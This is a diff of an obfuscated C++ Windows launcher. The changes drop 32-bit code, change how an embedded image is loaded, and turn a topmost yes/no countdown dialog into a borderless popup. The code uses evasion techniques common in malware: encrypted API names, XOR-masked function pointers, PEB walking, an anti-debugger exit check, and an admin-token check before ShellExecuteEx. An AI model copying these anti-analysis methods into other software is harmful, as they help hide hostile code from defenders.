@@ -12,11 +12,6 @@
 static char *valuebytes=NULL;
 static HANDLE iMutex;
 
-#ifdef __i386__
-  uint32_t __tls_start __attribute__ ((section (".tls")))=0;
-  uint32_t __tls_end __attribute__ ((section (".tls$ZZZ")))=0;
-#endif // __i386__
-
 #define low_byte(c) ((char)((uint8_t)(c&0x0f)+97))
 #define high_byte(c) ((char)((uint8_t)((c>>4)&0x0f)+97))
 template <char c> struct enc_a{ enum{ v=(char)low_byte( swapbytes[(uint8_t)c]) }; };
@@ -154,14 +149,8 @@ static HINSTANCE huser32,hshell32,hgdi32,hadvapi32,hkernel32,hntdll;
 #define GET_TIME_LAST_2BYTES(s) ((uint32_t)((s).QuadPart&0xffff))
 #define GET_TIME_LAST_BIT(s) ((uint32_t)((s).QuadPart&1))
 static volatile uint32_t seed=0;
-#ifdef __i386__
-  #define _f(f) ((void *)((uint32_t)f^(ffs[0]?seed:(ffs[1]?seed:0))^F_0^((uint32_t)ffs[(seed)&0xff]())^\
-  (((uint32_t)ffs[(seed>>8)&0xff]())<<8)^(((uint32_t)ffs[(seed>>16)&0xff]())<<16)^(((uint32_t)ffs[(seed>>24)&0xff]())<<24)))
-#endif // __i386__
-#ifdef __x86_64__
-  #define _f(f) (void *)(((uint64_t)f^(uint64_t)(ffs[0]?seed:(ffs[1]?seed:0))^(uint64_t)F_0^((uint64_t)ffs[(seed)&0xff]())^\
-  (((uint64_t)ffs[(seed>>8)&0xff]())<<8)^((uint64_t)ffs[(seed>>16)&0xff]())<<16)^(((uint64_t)ffs[(seed>>24)&0xff]())<<24))
-#endif // __x86_64__
+#define _f(f) (void *)(((uint64_t)f^(uint64_t)(ffs[0]?seed:(ffs[1]?seed:0))^(uint64_t)F_0^((uint64_t)ffs[(seed)&0xff]())^\
+(((uint64_t)ffs[(seed>>8)&0xff]())<<8)^((uint64_t)ffs[(seed>>16)&0xff]())<<16)^(((uint64_t)ffs[(seed>>24)&0xff]())<<24))
 
 __fdecl double pi(uint32_t t){
   double p=0.0;
@@ -241,6 +230,10 @@ typedef volatile BOOL (WINAPI *AAS)(PSID_IDENTIFIER_AUTHORITY,BYTE,DWORD,DWORD,D
 typedef volatile BOOL (WINAPI *CTM)(HANDLE,PSID,PBOOL); static CTM ctm;
 typedef volatile PVOID (WINAPI *FSD)(PSID); static FSD fsd;
 typedef volatile DWORD (WINAPI *GMF)(HMODULE,LPSTR,DWORD); static GMF gmf;
+typedef volatile HFONT (WINAPI *CFO)(int,int,int,int,int,DWORD,DWORD,DWORD,DWORD,DWORD,DWORD,DWORD,DWORD,LPCSTR); static CFO cfo;
+typedef volatile int (WINAPI *SBM)(HDC,int); static SBM sbm;
+typedef volatile COLORREF (WINAPI *STC)(HDC,COLORREF); static STC stc;
+typedef volatile int (WINAPI *DTX)(HDC,LPCSTR,int,LPRECT,UINT); static DTX dtx;
 typedef volatile BOOL (WINAPI *GNA)(LPSTR,LPDWORD); static GNA gna;
 
 extern "C" PVOID WINAPI RtlGetCurrentPeb();
@@ -275,18 +268,6 @@ __fdecl void get_module_name(HMODULE m,char *l){
 };
 
 __fdecl void get_handles(){
-#ifdef __i386__
-  __asm__ volatile(
-    "mov %2       , %0\n\t"
-    "mov 0x0C(%0) , %0\n\t"
-    "mov 0x14(%0) , %0\n\t"
-    "mov (%0)     , %0\n\t"
-    "mov 0x10(%0) , %1\n\t"
-    "mov (%0)     , %0\n\t"
-    "mov 0x10(%0) , %0\n\t"
-    : "=r"(hkernel32), "=r" (hntdll) : "r" (ppeb));
-#endif // __i386__
-#ifdef __x86_64__
   PLDR_DATA_TABLE_ENTRY ldrDataTableEntry=NULL;
   ldrDataTableEntry=CONTAINING_RECORD(ppeb->Ldr->InMemoryOrderModuleList.Flink->Flink,
                                       LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks);
@@ -294,7 +275,6 @@ __fdecl void get_handles(){
   ldrDataTableEntry=CONTAINING_RECORD(ppeb->Ldr->InMemoryOrderModuleList.Flink->Flink->Flink,
                                       LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks);
   hkernel32=(HMODULE)ldrDataTableEntry->DllBase;
-#endif // __x86_64__
 };
 
 __fdecl void *gpa(HMODULE m,const char *f){
@@ -346,11 +326,12 @@ __fdecl void *get_fn_ptr(HINSTANCE l,const char *f){
 };
 
 static HBITMAP hBitmap,hOldBitmap;
+static HFONT hFont,hOldFont;
 static HDC hdc,hdcMem;
 static BITMAP bm;
 static HINSTANCE hI;
 static PAINTSTRUCT ps;
-static RECT rect,rc,rc_yes,rc_no;
+static RECT rect,rc,rc_yes,rc_no,rt;
 static HPEN hpen;
 static POINT mpos;
 static BOOL mousetrack=FALSE,mark_yes=FALSE,mark_no=FALSE;
@@ -364,12 +345,14 @@ static char tnumbers[100][3];
 static LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
   switch(msg){
     case WM_CREATE:
-      hBitmap=((CBMP)_f(cbmp))(506,191,1,32,image);
+      hBitmap=((CBMP)_f(cbmp))(756,425,1,32,image);
       ((GOA)_f(goa))(hBitmap,sizeof(BITMAP),&bm);
       hdc=((GDC)_f(gdc))(hWnd);
       hdcMem=((CCDC)_f(cdc))(hdc);
       hOldBitmap=(HBITMAP)((SOB)_f(sob))(hdcMem,hBitmap);
-      hpen=((CRP)_f(crp))(PS_SOLID,8,RGB(39,39,39));
+      hpen=((CRP)_f(crp))(PS_SOLID,8,RGB(0,40,29));
+      hFont=((CFO)_f(cfo))(22,0,0,0,300,false,false,false,DEFAULT_CHARSET,OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,DEFAULT_PITCH,o("Arial"));
+      hOldFont=(HFONT)((SOB)_f(sob))(hdc,hFont);
       ((RDC)_f(rdc))(hWnd,hdc);
       return 0;
     case WM_KEYDOWN:
@@ -457,27 +440,30 @@ static LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lPar
       ((BLT)_f(blt))(hdc,0,0,rect.right,rect.bottom,hdcMem,0,0,SRCCOPY);
       if(mark_yes){
         ((SOB)_f(sob))(hdc,hpen);
-        ((MTE)_f(mte))(hdc,33,118,NULL);
-        ((LTO)_f(lto))(hdc,53,138);
-        ((LTO)_f(lto))(hdc,33,158);
-        ((MTE)_f(mte))(hdc,220,118,NULL);
-        ((LTO)_f(lto))(hdc,200,138);
-        ((LTO)_f(lto))(hdc,220,158);
+        ((MTE)_f(mte))(hdc,572,416,NULL);
+        ((LTO)_f(lto))(hdc,736,416);
+        ((MTE)_f(mte))(hdc,572,359,NULL);
+        ((LTO)_f(lto))(hdc,736,359);
       };
       if(mark_no){
         ((SOB)_f(sob))(hdc,hpen);
-        ((MTE)_f(mte))(hdc,286,118,NULL);
-        ((LTO)_f(lto))(hdc,306,138);
-        ((LTO)_f(lto))(hdc,286,158);
-        ((MTE)_f(mte))(hdc,473,118,NULL);
-        ((LTO)_f(lto))(hdc,453,138);
-        ((LTO)_f(lto))(hdc,473,158);
+        ((MTE)_f(mte))(hdc,20,416,NULL);
+        ((LTO)_f(lto))(hdc,183,416);
+        ((MTE)_f(mte))(hdc,20,359,NULL);
+        ((LTO)_f(lto))(hdc,183,359);
       };
+      rt={0,359,756,425};
+      ((SOB)_f(sob))(hdc,hFont);
+      ((SBM)_f(sbm))(hdc,TRANSPARENT);
+      ((STC)_f(stc))(hdc,RGB(65,177,96));
+      ((DTX)_f(dtx))(hdc,tnumbers[tcounter],-1,&rt,DT_CENTER|DT_NOCLIP|DT_VCENTER|DT_SINGLELINE);
       ((EPA)_f(epa))(hWnd,&ps);
       break;
     case WM_TIMER:
       if(tcounter){
-        SetWindowTextA(hWnd,tnumbers[--tcounter]);
+        tcounter--;
+        ((IVR)_f(ivr))(hWnd,NULL,FALSE);
+        ((UWI)_f(uwi))(hWnd);
       }
       else{
         DestroyWindow(hWnd);
@@ -490,6 +476,8 @@ static LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lPar
       ((DDC)_f(ddc))(hdcMem);
       ((DOB)_f(dob))(hBitmap);
       ((DOB)_f(dob))(hOldBitmap);
+      ((DOB)_f(dob))(hFont);
+      ((DOB)_f(dob))(hOldFont);
       break;
   }
   return DefWindowProcA(hWnd,msg,wParam,lParam);
@@ -510,10 +498,10 @@ __fdecl int dlg_window(HINSTANCE hInstance){
   wc.cbClsExtra=0;
   wc.cbWndExtra=0;
   RegisterClassA(&wc);
-  rc={0,0,506,191};
-  rc_yes={19,104,234,175};
-  rc_no={272,104,487,175};
-  ((AWR)_f(awr))(&rc,WS_CAPTION|WS_SYSMENU,FALSE);
+  rc={0,0,756,425};
+  rc_yes={552,350,756,425};
+  rc_no={0,350,203,425};
+  ((AWR)_f(awr))(&rc,WS_POPUP|WS_BORDER,FALSE);
   int nWidth=rc.right-rc.left;
   int nHeight=rc.bottom-rc.top;
   int nX=(((GSM)_f(gsm))(SM_CXSCREEN)-nWidth)/2;
@@ -523,7 +511,7 @@ __fdecl int dlg_window(HINSTANCE hInstance){
   tme.cbSize=sizeof(tme);
   tme.dwFlags=TME_HOVER|TME_LEAVE;
   tme.dwHoverTime=10;
-  HWND hWnd=CreateWindowExA(WS_EX_COMPOSITED|WS_EX_TOOLWINDOW|WS_EX_TOPMOST,wc.lpszClassName,NULL,WS_CAPTION|WS_SYSMENU,nX,nY,nWidth,nHeight,NULL,NULL,hInstance,NULL);
+  HWND hWnd=CreateWindowExA(WS_EX_COMPOSITED|WS_EX_TOPMOST,wc.lpszClassName,NULL,WS_POPUP|WS_BORDER,nX,nY,nWidth,nHeight,NULL,NULL,hInstance,NULL);
   if(!hWnd){
      UnregisterClassA(wc.lpszClassName,hInstance);
      return 0;
@@ -531,7 +519,6 @@ __fdecl int dlg_window(HINSTANCE hInstance){
   tme.hwndTrack=hWnd;
   ShowWindow(hWnd,SW_SHOW);
   SetTimer(hWnd,0,1000,(TIMERPROC)NULL);
-  SetWindowTextA(hWnd,tnumbers[tcounter]);
   ((UWI)_f(uwi))(hWnd);
   MSG msg;
   while(GetMessageA(&msg,NULL,0,0)){
@@ -864,26 +851,9 @@ __fdecl void free_mem(){
   if(frequency) LocalFree(frequency);
   if(vocbuf) LocalFree(vocbuf);
   if(valuebytes) LocalFree(valuebytes);
-  if(image) LocalFree(image);
 };
 
 __fdecl void dbg(){
-#ifdef __i386__
-  uint32_t pNtGlobalFlag,pFlags=0,pForceFlags=0;
-  __asm__ volatile(
-    "mov %3       , %0\n\t"
-    "mov 0x68(%0) , %2\n\t"
-    "mov 0x18(%0) , %0\n\t"
-    "mov 0x40(%0) , %1\n\t"
-    "mov 0x44(%0) , %0\n\t"
-    : "=r"(pForceFlags), "=r"(pFlags), "=r"(pNtGlobalFlag) : "r" (ppeb));
-  if((pNtGlobalFlag&0x70)||(pFlags&~HEAP_GROWABLE)||pForceFlags){
-    free_mem();
-    if(iMutex) CloseHandle(iMutex);
-    ExitProcess(1);
-  };
-#endif // __i386__
-#ifdef __x86_64__
   DWORD NtGlobalFlag=0;
   NtGlobalFlag=*(PDWORD)((PBYTE)ppeb+0xBC);
   PINT64 pProcHeap=(PINT64)((PBYTE)ppeb+0x30);
@@ -894,7 +864,6 @@ __fdecl void dbg(){
     if(iMutex) CloseHandle(iMutex);
     ExitProcess(1);
   };
-#endif // __x86_64__
   return;
 };
 
@@ -930,6 +899,7 @@ __fdecl void init(){
     if(iMutex) CloseHandle(iMutex);
     ExitProcess(1);
   };
+  image=res;
   read_mask=bytes2byte_raw();
   uint32_t c=0;
   bytes2uint(c);
@@ -986,7 +956,11 @@ __fdecl void init(){
   _s(f0038,"CheckTokenMembership",20);
   _s(f0039,"FreeSid",7);
   _s(f0040,"GetModuleFileNameA",18);
-  _s(f0041,"GetUserNameA",12);
+  _s(f0041,"CreateFontA",11);
+  _s(f0042,"SetBkMode",9);
+  _s(f0043,"SetTextColor",12);
+  _s(f0044,"DrawTextA",9);
+  _s(f0045,"GetUserNameA",12);
   seed=timebits();
   flib=(FLIB)get_fn_ptr(hkernel32,f0007);
   lla=(LLA)get_fn_ptr(hkernel32,f0025);
@@ -1018,6 +992,7 @@ __fdecl void init(){
   rwma=(RWMA)get_fn_ptr(huser32,f0026);
   sma=(SMA)get_fn_ptr(huser32,f0027);
   lca=(LCA)get_fn_ptr(huser32,f0030);
+  dtx=(DTX)get_fn_ptr(huser32,f0044);
   cbmp=(CBMP)get_fn_ptr(hgdi32,f0001);
   cdc=(CCDC)get_fn_ptr(hgdi32,f0002);
   ddc=(DDC)get_fn_ptr(hgdi32,f0003);
@@ -1028,26 +1003,21 @@ __fdecl void init(){
   crp=(CRP)get_fn_ptr(hgdi32,f0010);
   lto=(LTO)get_fn_ptr(hgdi32,f0011);
   mte=(MTE)get_fn_ptr(hgdi32,f0012);
+  cfo=(CFO)get_fn_ptr(hgdi32,f0041);
+  sbm=(SBM)get_fn_ptr(hgdi32,f0042);
+  stc=(STC)get_fn_ptr(hgdi32,f0043);
   sea=(SEA)get_fn_ptr(hshell32,f0006);
   cltaw=(CLTAW)get_fn_ptr(hshell32,f0028);
   aas=(AAS)get_fn_ptr(hadvapi32,f0037);
   ctm=(CTM)get_fn_ptr(hadvapi32,f0038);
   fsd=(FSD)get_fn_ptr(hadvapi32,f0039);
-  gna=(GNA)get_fn_ptr(hadvapi32,f0041);
+  gna=(GNA)get_fn_ptr(hadvapi32,f0045);
 };
 
-extern "C" void __stdcall start(){
+extern "C" void start(){
   init();
   uint32_t res_size=0;
-  image=(uint8_t*)LocalAlloc(LMEM_ZEROINIT,image_size);
   if(image){
-    bytes2uint(res_size);
-    init_unpack(res_size);
-    for(uint32_t i=0;i<image_size;i++){
-      if(unpack_file()) break;
-      image[i]=(uint8_t)symbol;
-      if(dptr==dsize) break;
-    };
     int c=0;
     LPWSTR *argv=((CLTAW)_f(cltaw))(((GCW)_f(gcw))(),&c);
     if(argv){
@@ -1122,7 +1092,7 @@ extern "C" void __stdcall start(){
             CloseHandle(iMutex);
             iMutex=0;
           };
-          if(((SEA)_f(sea))(&ShExecInfo)==FALSE) res_size=0;
+          ((SEA)_f(sea))(&ShExecInfo);
         };
         LocalFree(path);
       };
